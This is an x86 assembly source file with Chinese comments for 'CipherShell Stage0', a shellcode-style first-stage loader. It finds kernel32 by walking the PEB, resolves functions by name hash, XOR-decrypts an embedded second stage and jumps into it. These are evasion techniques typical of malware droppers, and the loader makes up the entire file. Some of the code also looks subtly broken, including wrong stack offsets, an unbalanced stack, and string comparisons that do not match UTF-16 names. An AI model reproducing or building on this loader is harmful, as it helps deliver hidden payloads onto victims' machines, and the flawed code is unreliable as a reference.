;
; CipherShell Stage0 - x86 初始解密器
; 使用 PEB 遍历获取 kernel32 基址，无导入依赖
;
; 编译命令：nasm -f win32 stage0_x86.asm -o stage0_x86.obj
;

bits 32

; ============================================================================
; 导出符号
; ============================================================================

global _Stage0Entry@0
global _GetKernel32Base
global _GetProcAddressByHash

; ============================================================================
; 常量定义
; ============================================================================

%define PEB_LDR_DATA_OFFSET     0x0C    ; PEB->Ldr (x86)
%define IN_MEMORY_ORDER_MODULE_LIST_OFFSET 0x14  ; LDR_DATA->InMemoryOrderModuleList

; ============================================================================
; 代码段
; ============================================================================

section .text

; ============================================================================
; Stage0Entry - 入口点
; ============================================================================
_Stage0Entry@0:
    pushad                          ; 保存所有寄存器
    
    ; 获取 kernel32 基址
    call _GetKernel32Base
    test eax, eax
    jz .error
    
    ; eax = kernel32.dll 基址
    ; 保存到 ebp 供后续使用
    mov ebp, eax
    
    ; 解密 Stage1
    ; 参数：[esp+24] = Stage1 数据指针（pushad 压入了 8 个寄存器）
    ; 参数：[esp+28] = Stage1 大小
    ; 参数：[esp+32] = 解密密钥指针
    mov esi, [esp + 24]             ; Stage1 数据指针
    mov ecx, [esp + 28]             ; Stage1 大小
    mov edi, [esp + 32]             ; 解密密钥指针
    
    ; 调用解密函数
    push edi                        ; 密钥
    push ecx                        ; 大小
    push esi                        ; 数据
    call _DecryptStage1
    add esp, 12
    
    ; 跳转到 Stage1
    jmp esi
    
.error:
    popad
    xor eax, eax
    ret

; ============================================================================
; GetKernel32Base - 通过 PEB 遍历获取 kernel32.dll 基址
; 返回：eax = kernel32.dll 基址
; ============================================================================
_GetKernel32Base:
    push ebx
    push esi
    push edi
    
    ; 获取 PEB 地址
    ; 方法1：通过 TEB (FS:[0x30] 在 x86)
    mov eax, fs:[0x30]              ; PEB 地址
    
    ; 获取 LDR 数据
    mov eax, [eax + PEB_LDR_DATA_OFFSET]  ; PEB->Ldr
    
    ; 获取 InMemoryOrderModuleList
    mov esi, [eax + IN_MEMORY_ORDER_MODULE_LIST_OFFSET]  ; 第一个模块
    
    ; 遍历模块列表
    ; 列表结构：LIST_ENTRY (Flink, Blink) + LDR_DATA_TABLE_ENTRY
    ; 模块基址在 LDR_DATA_TABLE_ENTRY + 0x10 (x86)
    
    mov ecx, esi                    ; 保存列表头
    
.loop:
    ; 获取模块基址
    mov eax, [esi + 0x10]           ; DllBase
    
    ; 检查是否为 kernel32.dll
    push eax
    push esi
    call _IsKernel32
    test eax, eax
    jnz .found
    
    ; 移动到下一个模块
    mov esi, [esi]                  ; Flink
    cmp esi, ecx                    ; 检查是否回到列表头
    jne .loop
    
    ; 未找到
    xor eax, eax
    jmp .done
    
.found:
    ; eax 已经是 kernel32 基址（在 _IsKernel32 中设置）
    
.done:
    pop edi
    pop esi
    pop ebx
    ret

; ============================================================================
; IsKernel32 - 检查模块是否为 kernel32.dll
; 参数：esi = 模块列表项指针
; 返回：eax = 1 如果是 kernel32，0 如果不是
; ============================================================================
_IsKernel32:
    push ebx
    push ecx
    push edx
    push esi
    push edi
    
    ; 获取模块名称
    ; 在 x86 中，BaseDllName 在 LDR_DATA_TABLE_ENTRY + 0x2C
    ; 但名称是 UNICODE_STRING 结构
    mov edi, [esi + 0x2C]           ; Buffer (UNICODE_STRING.Buffer)
    test edi, edi
    jz .not_kernel32
    
    ; 计算名称长度
    movzx ecx, word [esi + 0x28]    ; Length (UNICODE_STRING.Length)
    shr ecx, 1                      ; 转换为字符数
    
    ; 比较 "kernel32.dll" (不区分大小写)
    ; 简化：只比较前几个字符
    cmp ecx, 12                     ; "kernel32.dll" = 12 字符
    jl .not_kernel32
    
    ; 比较 "k"
    cmp word [edi], 'k'
    je .check_rest
    cmp word [edi], 'K'
    jne .not_kernel32
    
.check_rest:
    ; 比较 "ernel32"
    cmp dword [edi + 2], 'erne'
    jne .not_kernel32
    cmp dword [edi + 6], 'l32.'
    jne .not_kernel32
    
    ; 是 kernel32.dll
    mov eax, [esi + 0x10]           ; 返回 DllBase
    jmp .done
    
.not_kernel32:
    xor eax, eax
    
.done:
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    ret

; ============================================================================
; GetProcAddressByHash - 通过哈希值获取函数地址
; 参数：eax = 模块基址
;       ebx = 函数名哈希值
; 返回：eax = 函数地址
; ============================================================================
_GetProcAddressByHash:
    push ebx
    push ecx
    push edx
    push esi
    push edi
    
    ; 保存模块基址
    mov esi, eax
    
    ; 获取导出表 RVA
    mov eax, [esi + 0x3C]           ; e_lfanew
    mov eax, [esi + eax + 0x78]     ; DataDirectory[0].VirtualAddress (Export)
    test eax, eax
    jz .not_found
    
    ; 获取导出目录
    add eax, esi                    ; 转换为 VA
    mov edi, eax                    ; 保存导出目录指针
    
    ; 获取导出表信息
    mov ecx, [edi + 0x18]           ; NumberOfNames
    mov edx, [edi + 0x20]           ; AddressOfNames RVA
    add edx, esi                    ; 转换为 VA
    
    ; 遍历导出名称
    xor ebx, ebx                    ; 计数器
    
.name_loop:
    push ecx
    
    ; 获取名称
    mov eax, [edx + ebx * 4]        ; Name RVA
    add eax, esi                    ; 转换为 VA
    
    ; 计算哈希
    call _HashString
    
    ; 比较哈希
    pop ecx
    cmp eax, [esp + 20]             ; 参数中的哈希值
    je .found_name
    
    inc ebx
    loop .name_loop
    
.not_found:
    xor eax, eax
    jmp .done
    
.found_name:
    ; 获取序号
    mov eax, [edi + 0x24]           ; AddressOfNameOrdinals RVA
    add eax, esi
    movzx eax, word [eax + ebx * 2] ; 序号
    
    ; 获取函数地址
    mov edx, [edi + 0x1C]           ; AddressOfFunctions RVA
    add edx, esi
    mov eax, [edx + eax * 4]        ; 函数 RVA
    add eax, esi                    ; 转换为 VA
    
.done:
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    ret

; ============================================================================
; HashString - 计算字符串哈希
; 参数：eax = 字符串指针
; 返回：eax = 哈希值
; ============================================================================
_HashString:
    push ebx
    push ecx
    push edx
    push esi
    
    mov esi, eax
    xor eax, eax                    ; 哈希值
    xor ecx, ecx                    ; 临时存储
    
.hash_loop:
    mov cl, [esi]
    test cl, cl
    jz .hash_done
    
    ; 哈希算法：hash = hash * 33 + c
    ; 使用 ROL 5 代替乘法
    rol eax, 5
    add eax, ecx
    
    inc esi
    jmp .hash_loop
    
.hash_done:
    pop esi
    pop edx
    pop ecx
    pop ebx
    ret

; ============================================================================
; DecryptStage1 - 解密 Stage1 数据
; 参数：[esp+4] = 数据指针
;       [esp+8] = 数据大小
;       [esp+12] = 密钥指针
; ============================================================================
_DecryptStage1:
    push ebx
    push ecx
    push edx
    push esi
    push edi
    
    mov esi, [esp + 24]             ; 数据指针
    mov ecx, [esp + 28]             ; 数据大小
    mov edi, [esp + 32]             ; 密钥指针
    
    ; 简单的 XOR 解密
    xor ebx, ebx                    ; 密钥索引
    
.decrypt_loop:
    test ecx, ecx
    jz .decrypt_done
    
    mov al, [edi + ebx]             ; 获取密钥字节
    xor [esi], al                   ; XOR 解密
    
    inc esi
    inc ebx
    and ebx, 0x1F                   ; 密钥长度 32 字节
    dec ecx
    jmp .decrypt_loop
    
.decrypt_done:
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    ret
